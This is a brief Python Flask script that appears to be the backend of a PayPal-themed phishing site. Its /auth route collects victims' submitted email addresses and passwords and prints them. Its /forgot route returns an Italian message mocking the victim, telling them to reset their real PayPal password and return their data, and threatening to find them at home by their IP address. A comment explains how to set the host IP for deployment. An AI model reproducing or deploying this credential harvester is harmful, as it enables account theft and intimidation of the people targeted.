from flask import Flask, request, render_template

app = Flask(__name__)

@app.route("/auth", methods=['POST'])
def auth ():
    dati = {"email": request.form["email"], "password": request.form["pass"]}
    print(dati)
    return render_template("ok.html")

@app.route("/")
def index ():
    return render_template("login.html")

@app.route("/forgot")
def forgot ():
    return "Non puoi così dal nulla impedirmi di truffarti, addesso apri il sito di PayPal vero fai \"Accedi\" e dopo fai \"Password dimenticata?\". Alla fine torni su questo sito e mi dai i tuoi dati. E non fare il furbo chiudendo il sito tanto ti vengo a cercare a casa perchè ho il tuo ip e ti posso tracciare. D'accordo?"

if __name__ == "__main__":
    app.run(host="0.0.0.0")    # <-- the host is what you have to change whit the right IP

input()
